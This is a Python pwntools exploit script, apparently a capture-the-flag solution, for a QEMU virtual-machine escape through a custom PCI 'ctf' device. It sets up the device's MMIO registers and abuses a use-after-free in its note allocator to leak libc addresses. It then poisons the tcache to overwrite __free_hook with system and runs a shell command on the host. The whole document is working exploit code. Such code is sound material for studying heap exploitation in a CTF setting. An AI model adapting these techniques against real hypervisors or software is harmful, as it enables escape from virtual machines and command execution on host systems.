#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 1
if local:
    p = process('./qemu-system-x86_64 -display none -machine accel=qtest -m 512M -device ctf -nodefaults -monitor none -qtest stdio'.split())
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

MMIO_ADDR = 0x23300000

def init_pci():
    sl('outl {} {}'.format(0xcf8, 0x80001010))
    sl('outl {} {}'.format(0xcfc, MMIO_ADDR))
    sl('outl {} {}'.format(0xcf8, 0x80001004))
    sl('outw {} {}'.format(0xcfc, 0x107))

def set_idx(idx):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x40, idx))
    ru('OK')

def set_size(sz):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x8, sz))
    ru('OK')

def add_note():
    sl('writeq {} {}'.format(MMIO_ADDR + 0x10, 0xcafebabe))
    ru('OK')

def set_dma_addr(addr):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x18, addr))
    ru('OK')

def read_note():
    sl('writeq {} {}'.format(MMIO_ADDR + 0x20, 0xcafebabe))
    ru('OK')

def write_note():
    sl('writeq {} {}'.format(MMIO_ADDR + 0x28, 0xcafebabe))
    ru('OK')

def free_note():
    sl('writeq {} {}'.format(MMIO_ADDR + 0x30, 0xcafebabe))
    ru('OK')

def get_dma_addr():
    sl('readq {}'.format(MMIO_ADDR + 0x18))
    ru('OK ')
    content = ru('\n')
    ru('OK ')
    return content

def get_idx():
    sl('readq {}'.format(MMIO_ADDR + 0x40))
    ru('OK ')
    content = ru('\n')
    ru('OK ')
    return content

def get_size():
    sl('readq {}'.format(MMIO_ADDR + 0x8))
    ru('OK ')
    content = ru('\n')
    ru('OK ')
    return content

# base64 api
def readb64(addr, sz):
    sl('b64read {} {}'.format(addr, sz))
    ru('OK ')
    content = ru('\n')
    ru('OK ')
    return b64d(content)

def writeb64(addr, val):
    encoded = b64e(val)
    sl('b64write {} {} {}'.format(addr, len(val), encoded))
    ru('OK')

MAX_ADDR = 1 << 64
PHY_USERBUF = 0x40000

# init pci device
init_pci()

'''
for Debug:
    State Address: 0x5555572a7030
'''

# https://blog.imv1.me/2021/10/01/5th-space-qemu-pwn-writeup/
# alloc a large chunk (0x800)
set_idx(0x0)
set_size(0x800)
add_note()
# write data (0x1) to note
writeb64(PHY_USERBUF, p64(0x1))
set_dma_addr(PHY_USERBUF)
read_note()
# set index=0x1
set_dma_addr(MMIO_ADDR + 0x40) # index address
free_note()

# leak libc address
set_idx(0x0)
set_dma_addr(PHY_USERBUF)
write_note()
d1 = u64(readb64(PHY_USERBUF, 0x8))
d2 = u64(readb64(PHY_USERBUF + 0x8, 0x8))
x = 0x700000000000
if d1 < x:
    if d2 < x:
        info('no good')
        p.close()
        exit(-1)
    else:
        d1, d2 = d2, d1
libc_base = d1 - 0x1ecbe0
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
free_hook = libc_base + libc.sym['__free_hook']
info('free_hook = ' + hex(free_hook))

# tcache poisoning
for i in range(2, 6):
    set_idx(i)
    set_size(0x18)
    add_note()
# create dangling pointers
writeb64(PHY_USERBUF, p64(0x1))
for i in range(2, 6):
    set_idx(i)
    set_dma_addr(PHY_USERBUF)
    read_note()
# free tcache bins
for i in range(2, 6):
    set_idx(i)
    set_dma_addr(MMIO_ADDR + 0x40)
    free_note()
# write free_hook pointer (0x3)
writeb64(PHY_USERBUF + 0x300, p64(free_hook - 0x10))
set_idx(0x3)
set_dma_addr(PHY_USERBUF + 0x300)

# gdb.attach(p, 'pie breakpoint 0x0000000000411D8D')

read_note()

# write system pointer (0x9) & cmd data
for i in range(6, 10):
    set_idx(i)
    set_size(0x18)
    add_note()
writeb64(PHY_USERBUF + 0x100, p64(system))
cmd = b'cat /root/flag'
writeb64(PHY_USERBUF + 0x200, cmd)
set_idx(0x9)
set_dma_addr(PHY_USERBUF + 0x200)
read_note()
set_idx(0x8)
set_dma_addr(PHY_USERBUF + 0x100)
read_note()
# trigger free_hook
set_idx(0x9)
free_note()

p.interactive()

